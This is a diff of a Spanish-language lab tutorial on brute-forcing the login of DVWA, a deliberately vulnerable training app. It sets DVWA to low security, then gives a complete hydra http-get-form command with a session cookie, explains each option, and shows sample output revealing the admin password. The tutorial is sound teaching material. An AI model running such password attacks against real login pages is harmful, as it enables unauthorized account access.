@@ -131,25 +131,98 @@ docker-dvwa-dvwa_web-1  | Setting PHP IDS state:      disabled
 docker-dvwa-dvwa_web-1  | Setting PHP IDS verbosity:  false
 
 
- Y el proyecto estará ejecutando en el puerto 8000, en login.php, ingresamos con usuario admin y password admin, esto nos llevará a setup.php donde configuramos el proyecto presionando el boton  "Create/Reset Database" al final de la página, al final de la página aparecerá algo como:
+
+Y el proyecto estará ejecutando en el puerto 8000 (si usa https://labs.play-with-docker.com/, de click en el boton OPEN PORT y digite el numero 8000 ), en login.php, ingresamos con usuario admin y password admin, esto nos llevará a setup.php donde configuramos el proyecto presionando el boton  "Create/Reset Database" al final de la página, y ahora,  al final de la página aparecerá algo como:
 
  ...
+ 
  ..
+ 
  .
+ 
 Database has been created.
+
 'users' table was created.
+
 Data inserted into 'users' table.
+
 'guestbook' table was created.
+
 Data inserted into 'guestbook' table.
+
 Backup file /config/config.inc.php.bak automatically created
+
 Setup successful!
+
 Please login.
 
-Damos click al link de login que estará resltado en verde, en usuario colocamos admin y en password colocamos password, esto nos llevará a index.php
 
-ahí, vamos al las opciones finales y elegimos el boton de "DVWA Security" y elegimos el nivel "Low" y damos click al boton Submit, despuès vamos al boton de Brute Force y estamos listos para iniciar el ataque con hydra, 
 
-regresamos a la instancia donde se encuentra Hydra y 
+Damos click al link de login que estará resaltado en verde, en usuario colocamos admin y en password colocamos password, esto nos llevará a index.php y de ahí, vamos al las opciones finales y elegimos el boton de "DVWA Security" y elegimos el nivel "Low" y damos click al boton Submit (asegurese que en la parte superior diga "Security level is currently: low." y que en la parte inferior de la página diga "Security Level: low"), después vamos al boton de Brute Force y estamos listos para iniciar el ataque con hydra.
+
+En este punto, regresamos a la instancia donde tenemos ejecutando HYDRA (donde anteriormente conseguimos la contraseña de nuestro servicio SSH), estando ahí, ejecutamos el comando:
+
+
+hydra -l admin -P passlist.txt -s 8000 'http-get-form://192.168.0.18/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=5c679ddf2d5cd92408c8396204f18c51; security=low:F=Username and/or password incorrect' -V
+
+-l de login, el usuario admin, en este ejemplo
+
+-P de filepath, el archivo con nuestro diccionario de contraseñas, en este ejemplo, passlist.txt
+
+-s de port, en el ejemplo 8000
+
+http-get-form://192.168.0.18/vulnerabilities/brute/ define el formulario a donde atacaremos, en el ejemplo, el host esta en la 192.168.0.18
+
+:username=^USER^&password=^PASS^&Login=Login username, password y el boton Login, lo conseguimos del mismo formulario, es el nombre de los campos de entrada en HTML y del boton con nombre Login en el HTML también.
+
+PHPSESSID, es una cookie técnica que permite a los sitios web almacenar un identificador único para cada sesión de usuario, en el ejemplo, conseguimos el dato ingresando a la opcion de herramientas de desarrollador en google chrome, en la opción Application y elegimos donde dice cookie en la parte inferior, y deberiamos ver algo como:
+
+
+PHPSESSID	5c679ddf2d5cd92408c8396204f18c51	.ip172-18-0-21-crb52n2im2rg00bms5bg-8000.direct.labs.play-with-docker.com	/	2024-09-04T00:31:08.629Z	41	✓					Medium	
+
+__adroll_fpc	a819f74e8d00f47e01dfa033f711aa2b-1725109040798	.play-with-docker.com	/	2025-09-01T08:51:15.000Z	58			Lax			Medium	
+
+_biz_flagsA	%7B%22Version%22%3A1%2C%22ViewThrough%22%3A%221%22%2C%22XDomain%22%3A%221%22%2C%22Mkto%22%3A%221%22%7D	.play-with-docker.com	/	2025-08-31T12:57:18.000Z	113						Medium
+
+...
+
+..
+
+.
+
+Copiamos la parte que nos interesa 5c679ddf2d5cd92408c8396204f18c51 
+
+F=Username and/or password incorrect' es el mensaje que parece cuando ingreso una contraseña incorrecta
+
+Finalmente la opción -V es Verbose, para ver los detalles del proceso
+
+
+Una vez ingresado el comando anteriormente descrito, si todo va bien, deberiamos ver algo parecido a esto:
+
+
+[ATTEMPT] target 192.168.0.26 - login "admin" - pass "monkey" - 19 of 9999 [child 6] (0/0)
+
+[ATTEMPT] target 192.168.0.26 - login "admin" - pass "123321" - 20 of 9999 [child 4] (0/0)
+
+[ATTEMPT] target 192.168.0.26 - login "admin" - pass "dragon" - 21 of 9999 [child 1] (0/0)
+
+[ATTEMPT] target 192.168.0.26 - login "admin" - pass "654321" - 22 of 9999 [child 0] (0/0)
+
+[8000][http-get-form] host: 192.168.0.26   login: admin   password: password
+
+1 of 1 target successfully completed, 1 valid password found
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-03 00:50:13
+
+
+Donde claramento podemos ver que la contraseña es password, vamos a nuestro laboratorio DVWA e ingresamos usuario admin, y en password password y deberiamos ver una imagen que aparece, producto del reto logrado.
+
+Éxitos
+
+
+
+
+
 
 
 
